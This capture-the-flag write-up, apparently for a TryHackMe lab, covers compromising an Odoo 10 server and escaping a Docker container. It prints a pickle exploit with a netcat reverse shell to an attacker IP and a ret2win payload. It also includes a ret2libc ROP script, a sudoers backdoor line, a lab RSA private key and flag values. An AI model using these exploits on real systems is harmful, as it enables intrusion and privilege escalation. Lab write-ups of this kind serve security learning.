# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 21   | FTP     |
| 22   | SSH     |
| 80   | HTTP    |



# RECONNAISSANCE
---

Ftp Anonymous login is enabled, let's check it out:

![Pasted image 20250328163655.png](../../IMAGES/Pasted%20image%2020250328163655.png)

Let's check both files:

```
cat notice.txt

From antisoft.thm security,

A number of people have been forgetting their passwords so we've made a temporary password application.
```


```
file password
password: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=97fe26005f73d7475722fa1ed61671e82aa481ff, not stripped
```


Let's try checking the strings of the file:

```
strings password
/lib64/ld-linux-x86-64.so.2
libc.so.6
__isoc99_scanf
puts
__stack_chk_fail
printf
strcmp
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-X
SecurePaH
ssword12H
AWAVA
AUATL
[]A\A]A^A_
971234596
remember this next time '%s'
Incorrect employee id
Password Recovery
Please enter your employee id that is in your email
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.7594
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
password.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
_edata
pass
__stack_chk_fail@@GLIBC_2.4
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
strcmp@@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
_Jv_RegisterClasses
__isoc99_scanf@@GLIBC_2.7
__TMC_END__
_ITM_registerTMCloneTable
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got.plt
.data
.bss
.comment
```

If we check the strings, we can notice the following:

- When executed, the program prompts the user for theirÂ **employee ID**Â (e.g.,Â `Please enter your employee id that is in your email`).
- It checks if the entered ID matches the hardcoded valueÂ `971234596`Â (found in theÂ `strings`Â output).
- If the ID is correct, it generates/retrieves the password.
- If incorrect, it printsÂ `Incorrect employee id`.

So, let's execute the file and submit the correct id:

```
./password
Password Recovery
Please enter your employee id that is in your email
971234596
remember this next time 'SecurePassword123!'
```


Let's save that for now, we can proceed to the web application.

![Pasted image 20250328165621.png](../../IMAGES/Pasted%20image%2020250328165621.png)

It's a login page but we can find something interesting in here, a `manage databases` section, if we go into it we can find this:

![Pasted image 20250328165709.png](../../IMAGES/Pasted%20image%2020250328165709.png)

We can create a backup of the `main` database, let's use the password we got from earlier, it gives us a zip file, when we unzip it, we get a `filestore` and `dump.sql` file, with this, we can check on some basic stuff, for example, let's check the tables:

```
grep "CREATE TABLE" dump.sql
```

We get a bunch of useless stuff, but we can check this thing:

```
public.res_users
```

If we try visualizing the contents, we can find the `admin@antisoft.thm` user:

![Pasted image 20250328171455.png](../../IMAGES/Pasted%20image%2020250328171455.png)

Let's try using the password we got before, if we're lucky, we can access the panel:


```
admin@antisoft.thm:SecurePassword123!
```


![Pasted image 20250328171629.png](../../IMAGES/Pasted%20image%2020250328171629.png)

There we go, let's start exploitation phase.


# EXPLOITATION
---

We are inside `odoo`, **Odoo**Â is a popularÂ **open-source Enterprise Resource Planning (ERP) software**Â used by businesses to manage operations like sales, accounting, inventory, HR, and more, let's look at the version:

![Pasted image 20250328171739.png](../../IMAGES/Pasted%20image%2020250328171739.png)



Let's search for an exploit:

![Pasted image 20250328171812.png](../../IMAGES/Pasted%20image%2020250328171812.png)

We got a code execution vulnerability regarding Odoo 10


```
## Vulnerability Details
One of the core Odoo modules, Database Anonymization, allows an administrator to anonymize the contents of the Odoo database. The module does this by serializing the contents of the existing database using Pythonâ€™s pickle module into a backup file before modifying the contents of the database. The administrator can then de-anonymize the database by loading the pickled backup file.

Pythonâ€™s pickle module can be made to execute arbitrary Python code when loading an attacker controlled pickle file. With this, an administrator can execute arbitrary Python code with the same privilege level as the Odoo webapp by anonymizing the database then attempt the de-anonymization process with a crafted pickle file.

## Proof of Concept
In order to exploit the vulnerability, you should navigate to the Apps page (the link is in the navigation bar at the top and search for and install â€œDatabase Anonymizationâ€ in the search bar. We have to deselect the â€œAppsâ€ filter in the search bar for it to show up.

Once we have the module installed, we navigate to the settings page and select â€œAnonymize databaseâ€ under â€œDatabase anonymizationâ€ and click on the â€œAnonymize Databaseâ€ button. Next, we refresh the page and navigate to the same page under settings. We upload the â€œexploit.pickleâ€ file generated our script and click on â€œReverse the Database Anonymizationâ€ button. We should have a reverse shell.
```


Let's use the exploit provided by `exploit-db`:

Link: https://www.exploit-db.com/exploits/44064

We need to modify the script a little bit:


```python
import cPickle
import os
import base64
import pickletools

class Exploit(object):
	def __reduce__(self):
		return (os.system, (("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.6.34.159 9001 >/tmp/f"),))

with open("exploit.pickle", "wb") as f:
	cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)

```


We can now use it:

```
python2 exploit.py
```

It will generate a `exploit.pickle` file, in order to exploit this, we need to do the following:

```
Go toÂ Apps.
Remove the "Apps" filter and search forÂ Database Anonymization.
Install the module
```

![Pasted image 20250328172649.png](../../IMAGES/Pasted%20image%2020250328172649.png)


Now:

```
Navigate toÂ SettingsÂ â†’Â Database Anonymization.
ClickÂ Anonymize DatabaseÂ to create a backup (this step is required to enable reversal).
Refresh the page.
UnderÂ Database Anonymization, clickÂ Reverse the Database Anonymization.
Set up listener
UploadÂ exploit.pickleÂ and confirm.
```

![Pasted image 20250328173631.png](../../IMAGES/Pasted%20image%2020250328173631.png)

If we check our listener:

![Pasted image 20250328173643.png](../../IMAGES/Pasted%20image%2020250328173643.png)

We got our shell, let's proceed with privilege escalation.


# PRIVILEGE ESCALATION
---

Let's start with stabilizing our shell:


```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250328173800.png](../../IMAGES/Pasted%20image%2020250328173800.png)

Now we're good to start, we can check this:

![Pasted image 20250328174443.png](../../IMAGES/Pasted%20image%2020250328174443.png)

We got a `/ret` binary, let's run it:


![Pasted image 20250328174509.png](../../IMAGES/Pasted%20image%2020250328174509.png)

Weird, it could mean we are inside of a docker container:

![Pasted image 20250328174532.png](../../IMAGES/Pasted%20image%2020250328174532.png)

![Pasted image 20250328174544.png](../../IMAGES/Pasted%20image%2020250328174544.png)

We are inside of a docker container, let's analyze the binary in our local machine, since `python3` is not enabled in the container we need to go with `nc`:

```
nc -l -p PORT > ret # On our receiver machine
nc -w 3 RECEIVER_IP PORT < ret # On our shell
```

We can go with `ghidra` to analyze the binary:

![Pasted image 20250328175340.png](../../IMAGES/Pasted%20image%2020250328175340.png)

We can see the following, there's a `vuln()` function which goes with this:

![Pasted image 20250328175458.png](../../IMAGES/Pasted%20image%2020250328175458.png)

The vuln function uses `gets()`, we can find another function called `win`:

![Pasted image 20250328175558.png](../../IMAGES/Pasted%20image%2020250328175558.png)

We are dealing with something called `ret2win`, let's search how to exploit this:

Info: https://ir0nstone.gitbook.io/notes/binexp/stack/ret2win


We can do this, after analyzing the binary, I found that the `win()` function address is `0x400646` and the `$rsp` location is `136`, with this data, we can craft the following script to get a test payload:


```python
import pwn

win_location = pwn.p64(0x400646)

payload = b"".join(
	[
		b"A"*136, 
		win_location,
	]
)

with open("payload.p", "wb") as file:
	file.write(payload)
```

```
pip install pwn
```

We can run it and start a python server to download the `payload.p` file:

```
curl http://10.6.34.159:8000/payload.p -o /tmp/payload.p
```

We can now do this:

```
(cat /tmp/payload.p; cat) | ./ret
```

If we do this:

![Pasted image 20250328181735.png](../../IMAGES/Pasted%20image%2020250328181735.png)

We got root on the docker container, we need some way to break out of it, let's use a `nmap` binary to scan the network:

```
curl http://10.6.34.159:8000/nmap -o /tmp/nmap
```

```
./tmp/nmap -sT -p- 172.17.0.1
```

![Pasted image 20250328182044.png](../../IMAGES/Pasted%20image%2020250328182044.png)

Something is running on port `4444`, let's use `nc` to look at it:

```
nc 172.17.0.1 4444
```

![Pasted image 20250328182132.png](../../IMAGES/Pasted%20image%2020250328182132.png)

It runs the same as `ret` binary, we can exploit it in the same way then:

```
(cat /tmp/payload.p; cat) | nc 172.17.0.1 4444
```

![Pasted image 20250328182223.png](../../IMAGES/Pasted%20image%2020250328182223.png)

We got a shell as `zeeshan`, let's try reading his home folder to check if there's a private key for ssh:


![Pasted image 20250328182321.png](../../IMAGES/Pasted%20image%2020250328182321.png)

There we go, let's get it:

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAxuNhK456dD+WXwoMLkfzQPvBsbnN27Aq8NfCVp4625XyoXi+
i2g2nYNOarOGX+/q/M0UmoObiaJOPLLig9oFm8ZPxHtmVgOTX2Go1pDWotEHZHL3
GdQ+W8lkg+h/X2C5WwlqUjcQxBuPsMgvZB4W714u5FpFOhiKtMwh20VX8AcwptJ8
ET4m79e+lChbPJqsQZcmtKkjzWhlIimfZWhYHca7DtljYpQf4+uVIle6diy5xot7
lxNniPc9v1y1YFSHYrFfFYmlnniWnBrVhXBw0sydJTnISxvI1p7pw4vMZX441oHb
FNsC+oCtW36HPEprpySilvIzdv1d8N56cW6BZQIDAQABAoIBAQCnb6NNbPxwQ1wP
lMDecZo7Wfcd7UN+MJhl++5Sx5Dbbig+gg1ABbL89h8dOxfkSnG0893lmuhlfWuK
NDr4L6LLGq/qxMxJm2cFRI1EXdkkZv9nNFYMu57n3OsvFZutqxtApfOJVWxa/K0C
cfVbvu0mBU9K1Sg0mZakULosA/vdSGQGXdyS1UmDNSLbfnffyccdk+TiB0mnKpp5
JfE3yML08AJYruEG7ZoNMM170RFtE40al1aox7X9fxe434+sTlBHWXNf+FkHTO8O
gQRQZKEDA2mMpUflMDRSyRjmoZfap7i9LCea4U7jlUeFH13ex3Sgbj6zOeIKMpCq
XBUKaSmhAoGBAOut6/PntcLUJns9oF1I6a4+343Au+Trx3UGeQCXOwIb1WhAXBH4
OvKZEK0qb76MANTU3VdqLXXLwharMd/AyXYX0cXObVQ7FWWF318+3JgVU7q65yx1
11+ZCIaRJfJDEjvbroEvD9xbPcDj3naYaJyqc2mV9OPov8cqAe8PZ+dZAoGBANgJ
YKRJUSyNP2E5xENkaUvQ+OODN4cwMO0yB4QAbFfSvZiR1vVllbgWlQQciAm7WY4j
ovQGrC6/tBr2ylza7hYFq3mNb1vvvKOZSr8x/FYhvoSpA4vMxDFmGM8Fc/gd3guv
LSPPP5nM1GBbgydL3rY5ZIhwCOQOj2ymqoKQkXTtAoGALFgGHFdNqMHYF7opsUOl
zEZCM96+u7ztQ4SbQdQyoxvvlHT/ndXx6XGJZLumWNjo0yLWHrt4oEBdXXyKnsoc
Xd7vdmN3yLBxPy/oLniacvcYUPsXwhLOGkumAgPPevzJsn+MHvxm5JQ6U0/MrM3S
aR/dJVG0ySki5Gtv/7YLW8kCgYEAhKCtLe684OcOI/g830rDwgHW6oXiDyKsxtHR
/13rJbeBIitWlmz5D3z9mvqRIbhc8IA8SCfYiRKz1WHxNjRJukdc0FDeLsjtPFqd
oudjDNXGitbgEHFzeQg+7slgOtDLQs0Wn0daumcfctB7oiJX5fMyHvj43Fl7/64K
PAHY6rkCgYEAsVk6DjjzRQCAMoyC9H4bwAWMkvYerSkmvIo3efCMyUdKtMjg3cCv
EFmGDkEL3l6/2W3bmF6kbYDOeSyRjAaZp59QUiNliiHneD9VwCVXT/IF70O+kNkf
c7FgDFMEoa44S7BZIhxymHyGN7xgPQ6EJonUuMCfmP83KLRZrkI4FPI=
-----END RSA PRIVATE KEY-----
```

We can now go into ssh:

![Pasted image 20250328182433.png](../../IMAGES/Pasted%20image%2020250328182433.png)

We finally got out of the docker container, with this, let's figure out how to get into root:

```
zeeshan@hydra:~$ sudo -l
Matching Defaults entries for zeeshan on hydra:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User zeeshan may run the following commands on hydra:
    (ALL : ALL) ALL
    (root) NOPASSWD: /exploit_me
```


We got a `/exploit_me` file, let's check it:

![Pasted image 20250328182732.png](../../IMAGES/Pasted%20image%2020250328182732.png)

Let's download the file in our local machine and analyze it:

```
file exploit_me
exploit_me: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=589ddc7b680c9a773ae64cc2db0e877b490e943e, not stripped
```

We can use the following payload to get root:```

```python
from pwn import *

user = "zeeshan"
port = 22
host = "IP"
private_key = "id_rsa"

ssh_connection = ssh(host=host, user=user, keyfile=private_key, port=port)

# Load the binary
context.binary = binary = ELF("./exploit_me", checksec=False)
_ROP = ROP(binary)


padding = b'A' * 40
pop_rdi_ret_address = p64(_ROP.find_gadget(["pop rdi", "ret"])[0])
plt_puts_address = p64(binary.plt.puts)
got_puts_address = p64(binary.got.puts) 
got_gets_address = p64(binary.got.gets)
got_setuid_address = p64(binary.got.setuid)
main_address = p64(binary.symbols.main)

payload = padding
payload += pop_rdi_ret_address + got_puts_address + plt_puts_address
payload += pop_rdi_ret_address + got_gets_address + plt_puts_address
payload += pop_rdi_ret_address + got_setuid_address + plt_puts_address
payload += main_address

p = ssh_connection.process("/exploit_me")
p.recvline()
p.sendline(payload)
output = p.recv().split(b"\n")

# Left-justify the returned hex so it can be unpacked.
puts_address = u64(output[0].ljust(8, b"\x00"))
gets_address = u64(output[1].ljust(8, b"\x00"))
setuid_address = u64(output[2].ljust(8, b"\x00"))

print(f"Puts address: {hex(puts_address)}")
print(f"Gets address: {hex(gets_address)}")
print(f"Setuid address: {hex(setuid_address)}")
```

With the script from above, we can get this:

```python
python3 root.py
[+] Connecting to 10.10.142.145 on port 22: Done
[*] zeeshan@10.10.142.145:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.0
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[*] Loaded 14 cached gadgets for './exploit_me'
[+] Starting remote process None on 10.10.142.145: pid 7558
[!] ASLR is disabled for '/exploit_me'!
Puts address: 0x7f2227e826a0
Gets address: 0x7f2227e81d90
Setuid address: 0x7f2227ee0330
```

![Pasted image 20250328185828.png](../../IMAGES/Pasted%20image%2020250328185828.png)

Now, with each address, we can calculate the offset to the base address using libc:

![Pasted image 20250328185935.png](../../IMAGES/Pasted%20image%2020250328185935.png)

Let's download the second file, the first file didn't work for me and simply do the following payload to get root:



```python
from pwn import *

user = "zeeshan"
port = 22
host = "antisoft.thm"
private_key = "./id_rsa"

ssh_connection = ssh(host=host, user=user, keyfile=private_key, port=port)

context.binary = binary = ELF("./exploit_me", checksec=False)

_ROP = ROP(binary)

padding = b'A' * 40
pop_rdi_ret_address = p64(_ROP.find_gadget(["pop rdi", "ret"])[0])
plt_puts_address = p64(binary.plt.puts)
got_puts_address = p64(binary.got.puts)
got_gets_address = p64(binary.got.gets)
got_setuid_address = p64(binary.got.setuid)
main_address = p64(binary.symbols.main)

payload = padding
payload += pop_rdi_ret_address + got_puts_address + plt_puts_address
payload += pop_rdi_ret_address + got_gets_address + plt_puts_address
payload += pop_rdi_ret_address + got_setuid_address + plt_puts_address
payload += main_address

p = ssh_connection.process("/exploit_me")
p.recvline()
p.sendline(payload)
output = p.recv().split(b"\n")

puts_address = u64(output[0].ljust(8, b"\x00"))
gets_address = u64(output[1].ljust(8, b"\x00"))
setuid_address = u64(output[2].ljust(8, b"\x00"))

print(f"Puts address: {hex(puts_address)}")
print(f"Gets address: {hex(gets_address)}")
print(f"Setuid address: {hex(setuid_address)}")

libc = ELF("./libc6_2.23-0ubuntu11.3_amd64.so", checksec=False)
libc.address = puts_address - libc.sym["puts"]
print(f"libc Base address: {hex(libc.address)}")

bin_sh_address = p64(next(libc.search(b"/bin/sh")))
pop_rdi_ret_address = p64(_ROP.find_gadget(["pop rdi", "ret"])[0])
alignment_issue_ret_address = p64(_ROP.find_gadget(["ret"])[0])
system_address = p64(libc.symbols.system)

payload = padding
payload += alignment_issue_ret_address
payload += pop_rdi_ret_address
payload += bin_sh_address
payload += system_address

p.sendline(payload)
p.interactive()
```

We get the following:


![Pasted image 20250328191503.png](../../IMAGES/Pasted%20image%2020250328191503.png)

There we go, we can add `zeeshan` to `sudoers` to move easily using ssh:

```
echo "zeeshan ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```

And then:

```
sudo su
```

![Pasted image 20250328191705.png](../../IMAGES/Pasted%20image%2020250328191705.png)
```
find / -type f \( -path /proc -o -path /sys -o -path /dev \) -prune -o -name "*.txt" -exec grep -H 'THM{\{' {} \; 2>/dev/null
```
Now, we can read all flags:

```
$ cat /var/lib/odoo/flag.txt # This one needs to be read inside of the first shell
THM{1243b64a3a01a8732ccb96217f593520}
```

```
root@hydra:/home/zeeshan# cat /home/zeeshan/user.txt
THM{43b0b68ba2755dd6cac3b8bf5454db94}
```

```
root@hydra:/home/zeeshan# cat /root/root.txt
THM{8bbc6221d009576d37e28acdd9da7aba}
```

![Pasted image 20250328192438.png](../../IMAGES/Pasted%20image%2020250328192438.png)

